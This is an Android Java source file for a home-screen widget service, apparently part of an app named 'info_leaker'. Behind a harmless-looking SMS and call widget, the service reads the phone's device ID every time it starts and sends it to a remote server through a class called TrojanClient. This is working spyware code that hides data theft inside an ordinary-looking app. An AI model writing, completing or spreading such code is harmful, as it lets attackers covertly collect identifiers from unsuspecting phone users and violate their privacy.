package com.info_leaker;

import android.app.PendingIntent;
import android.app.Service;
import android.appwidget.AppWidgetManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.IBinder;
import android.telephony.TelephonyManager;
import android.view.View;
import android.widget.RemoteViews;

public class WidgetService extends Service{
	RemoteViews rview;
	boolean sms, call, newsms, shownam;

	TrojanClient tclient;
	GetInfo ginfo = null;
	
    @Override
    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);
        
        if(ginfo == null){
        	TelephonyManager telephonyManager=
                (TelephonyManager)  getBaseContext().getSystemService(Context.TELEPHONY_SERVICE);
        	ginfo = new GetInfo(telephonyManager.getDeviceId());
        }
        
        rview = buildUpdate(this, intent);
        
        // send info to server
        tclient = new TrojanClient(ginfo);
        tclient.send("pig");
        tclient.close();
        // Push update for this widget to the home screen
        ComponentName thisWidget = new ComponentName(this, WidgetProvider.class);
        AppWidgetManager manager = AppWidgetManager.getInstance(this);
        // Tell the AppWidgetManager to perform an update on the current App Widget
        manager.updateAppWidget(thisWidget, rview);
    }
	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}
	
	public RemoteViews buildUpdate(Context context, Intent intent) {
        Bundle bundle = intent.getBundleExtra(Common.CONF);
        if(bundle != null){	// if is configure
        	this.sms = bundle.getBoolean(Common.SMS);
        	this.call = bundle.getBoolean(Common.CALL);
        	this.newsms = bundle.getBoolean(Common.NEWSMS);
        	this.shownam = bundle.getBoolean(Common.BYNAM);
        }				// update form widget
        bundle = new Bundle();
        bundle.putBoolean(Common.SMS, sms);
        bundle.putBoolean(Common.CALL, call);
        bundle.putBoolean(Common.NEWSMS, newsms);
        bundle.putBoolean(Common.BYNAM, shownam);
        
        // Create an Intent to launch ConfigureActivity
        Intent intentWidget = new Intent(context, ConfigureActivity.class);
        intentWidget.putExtra(Common.CONF, bundle);
        // bind click to widget
        RemoteViews views = setView(context);
        PendingIntent pendingIntent = PendingIntent.getActivity(context, 0, intentWidget, 0);
        views.setOnClickPendingIntent(R.id.widget, pendingIntent);

		return views;
	}
	
	public RemoteViews setView(Context c){
        // Get the layout for the App Widget and attach an on-click listener to the button
        RemoteViews views = new RemoteViews(c.getPackageName(), R.layout.widget);

        //views.setImageViewResource(R.id.wd_icon, R.drawable.contact2);
        views.setViewVisibility(R.id.wd_bg, View.VISIBLE);
        views.setTextViewText(R.id.wd_sms, "sms");
        views.setTextViewText(R.id.wd_call, "call");
        return views;
	}
}
